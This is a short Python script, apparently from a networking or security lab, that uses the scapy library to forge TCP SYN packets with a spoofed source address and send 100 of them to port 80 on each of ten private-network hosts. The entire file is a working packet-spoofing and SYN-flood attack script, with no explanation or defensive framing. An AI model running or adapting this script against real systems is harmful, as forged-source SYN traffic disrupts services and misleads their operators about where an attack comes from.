#!/usr/bin/python3
 
from scapy.all import *
 
for ipadd in range(131,141):
 
    spoofed_ip = "192.168.244.102"
    destination_address = "192.168.244." + str(ipadd)
    #destination_address = "192.168.244.128"
    print(destination_address)
    target_por = 80
    ip = IP(src=spoofed_ip, dst=destination_address)
    tcp = TCP(sport=RandShort(), dport = target_por, seq=12345, ack=1000, flags="S")
    p = ip / tcp
    send(p, count=100, inter = 3, verbose = 0)
